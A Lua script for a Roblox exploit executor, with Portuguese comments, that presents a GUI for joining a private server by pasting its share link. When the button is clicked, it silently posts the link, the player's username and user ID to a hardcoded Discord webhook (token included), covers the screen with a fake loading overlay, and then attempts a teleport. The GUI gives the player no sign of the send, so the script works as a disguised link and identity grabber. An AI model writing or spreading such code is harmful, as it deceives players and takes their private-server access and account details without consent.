-- GUI para entrar em servidor privado do Roblox via executor
-- Envia o link para seu Discord via webhook ao clicar "Entrar"

-- Remove GUIs antigas se existirem
pcall(function() game.CoreGui.RobloxPrivateServerGUI:Destroy() end)
pcall(function() game.CoreGui.RobloxPrivateServerLoading:Destroy() end)

local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1430235119813263485/VDyDMnv2AxKAFnR1gmObyyvRAR9Nn9VxbFsEJe4ANlvc5lAT9bX-_ZtVJ4XqWQwOou5P"

local function sendToDiscord(link, player)
    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Novo link de servidor privado enviado!",
            ["description"] = "**Link:** "..link.."\n**Jogador:** "..player.Name.." (ID: "..player.UserId..")",
            ["color"] = 5793266
        }}
    }
    local json = game:GetService("HttpService"):JSONEncode(data)
    local req
    if syn and syn.request then
        req = syn.request
    elseif http and http.request then
        req = http.request
    elseif http_request then
        req = http_request
    elseif request then
        req = request
    end

    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RobloxPrivateServerGUI"
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 350, 0, 150)
Frame.Position = UDim2.new(0.5, -175, 0.5, -75)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Text = "Coloque o Link do Servidor Privado do Roblox"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 16
Title.Parent = Frame

local Input = Instance.new("TextBox")
Input.PlaceholderText = "https://www.roblox.com/share?code=..."
Input.Size = UDim2.new(1, -20, 0, 35)
Input.Position = UDim2.new(0, 10, 0, 40)
Input.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Input.TextColor3 = Color3.fromRGB(255,255,255)
Input.Font = Enum.Font.SourceSans
Input.TextSize = 16
Input.Parent = Frame

local Button = Instance.new("TextButton")
Button.Text = "Entrar"
Button.Size = UDim2.new(1, -20, 0, 35)
Button.Position = UDim2.new(0, 10, 0, 85)
Button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Button.TextColor3 = Color3.fromRGB(255,255,255)
Button.Font = Enum.Font.SourceSansBold
Button.TextSize = 16
Button.Parent = Frame

local Message = Instance.new("TextLabel")
Message.Text = ""
Message.Size = UDim2.new(1, -20, 0, 20)
Message.Position = UDim2.new(0, 10, 0, 125)
Message.BackgroundTransparency = 1
Message.TextColor3 = Color3.fromRGB(0,255,0)
Message.Font = Enum.Font.SourceSans
Message.TextSize = 14
Message.Parent = Frame

local function showLoading()
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "RobloxPrivateServerLoading"
    loadingGui.Parent = game.CoreGui
    loadingGui.IgnoreGuiInset = true

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Parent = loadingGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 1, 0)
    loadingText.Position = UDim2.new(0, 0, 0, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Carregando, aguarde..."
    loadingText.TextColor3 = Color3.fromRGB(255,255,255)
    loadingText.Font = Enum.Font.SourceSansBold
    loadingText.TextSize = 38
    loadingText.Parent = blackFrame
end

Button.MouseButton1Click:Connect(function()
    local link = Input.Text
    local code = string.match(link, "code=([a-zA-Z0-9]+)")
    if code then
        local placeId = game.PlaceId
        -- Envia para o Discord
        sendToDiscord(link, LocalPlayer)
        -- Tela preta e carregando
        ScreenGui.Enabled = false
        showLoading()
        -- Teleporta
        TeleportService:TeleportToPrivateServer(placeId, code, {LocalPlayer})
    else
        Message.Text = "Insira um link válido de servidor privado!"
        Message.TextColor3 = Color3.fromRGB(255,0,0)
    end
end)
